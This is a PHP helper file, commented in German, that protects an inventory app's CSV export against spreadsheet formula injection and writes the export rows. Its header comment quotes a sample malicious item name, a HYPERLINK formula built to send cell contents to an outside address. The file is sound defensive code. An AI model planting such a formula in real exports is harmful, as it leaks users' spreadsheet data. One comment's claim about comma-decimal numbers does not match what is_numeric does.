<?php
/**
 * helpers_csv.php - Schutz vor Formeln in CSV-Exporten (OWASP-A05-003, 4.6)
 *
 * Ein Tabellenprogramm liest eine Zelle, die mit = + - @ beginnt, als Formel.
 * Ein Gegenstand namens =HYPERLINK("https://...?"&A2;"Rechnung") wird beim
 * Oeffnen des Exports zu einem Link, der Zellinhalte nach aussen schickt.
 * Bis 4.5.2 schuetzte nur die CSV des Schadensfalls davor, nicht der
 * allgemeine CSV-Export (export_csv.php).
 */

if (!function_exists('vsCsvFormelSchutz')) {
    /**
     * Setzt vor einen Wert, der als Formel gelesen wuerde, ein Hochkomma.
     * Zahlen wie -12,50 bleiben unveraendert; Tab und Wagenruecklauf am
     * Anfang zaehlen mit, weil manche Programme sie vor = ueberspringen.
     */
    function vsCsvFormelSchutz($v): string {
        $v = (string)$v;
        // Ein einzelnes "-" ist der Platzhalter fuer leere Felder, keine Formel
        if ($v !== '' && $v !== '-' && strpbrk($v[0], "=+-@\t\r") !== false && !is_numeric($v)) {
            return "'" . $v;
        }
        return $v;
    }
}

// Laden und Schreiben des allgemeinen CSV-Exports stehen seit 4.6 hier statt
// in export_csv.php, damit Spalten, Umlaute, Formelschutz und "nur eigene"
// automatisch geprueft werden koennen (tests/CsvExportTest.php). Wortlaut
// unveraendert; export_csv.php setzt weiter Rechte, Kopfzeilen und Protokoll.

if (!function_exists('vsCsvExportLaden')) {
    /** Gegenstaende fuer den CSV-Export; $ownSql/$ownParams aus nurEigeneSql('w'). */
    function vsCsvExportLaden($db, string $ownSql, array $ownParams): array {
        $sql = "SELECT w.*, o.name as ort_name, k.name as kategorie_name 
            FROM wertsachen w 
            LEFT JOIN raeume o ON w.raum_id = o.id 
            LEFT JOIN kategorien k ON w.kategorie_id = k.id 
            WHERE 1=1" . $ownSql . "
            ORDER BY w.name";

        return $db->select($sql, $ownParams);
    }
}

if (!function_exists('vsCsvExportSchreiben')) {
    /**
     * Schreibt BOM, Kopfzeile und je Gegenstand eine Zeile (Tab als
     * Trennzeichen) in $output. Braucht t() und formatDateLocalized() usw.
     * aus helpers.php.
     */
    function vsCsvExportSchreiben($output, array $wertsachen): void {
        // UTF-8 BOM für Excel-Kompatibilität
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF));

        // Header-Zeile - Tab als Trennzeichen. Escape-Zeichen '' (nicht
        // '\\'): sonst verdoppelt fputcsv() ein " nach einem \ nicht, und
        // Excel liest die Zelle falsch (tests/TESTFUNDE.md, FUND-06).
        fputcsv($output, [
            t('csv_header_id'),
            t('csv_header_name'),
            t('csv_header_location'),
            t('csv_header_category'),
            t('csv_header_purchase_date'),
            t('csv_header_price'),
            t('csv_header_notes'),
            t('csv_header_image'),
            t('csv_header_created_by'),
            t('csv_header_listed_on'),
            t('csv_header_created_at')
        ], "\t", '"', '');

        // Datenzeilen
        // Jede Zelle mit Formelschutz (OWASP-A05-003)
        foreach ($wertsachen as $item) {
            fputcsv($output, array_map('vsCsvFormelSchutz', [
                $item['id'],
                $item['name'],
                $item['ort_name'] ?? '',
                $item['kategorie_name'] ?? '',
                formatDateLocalized($item['kaufdatum']),
                formatPriceLocalized($item['preis']),
                $item['notizen'] ?? '',
                $item['bild'] ?? '',
                $item['erstellt_von'] ?? '',
                formatDateLocalized($item['gelistet_am'] ?? null),
                formatDateTimeLocalized($item['erstellt_am'] ?? null)
            ]), "\t", '"', '');
        }
    }
}
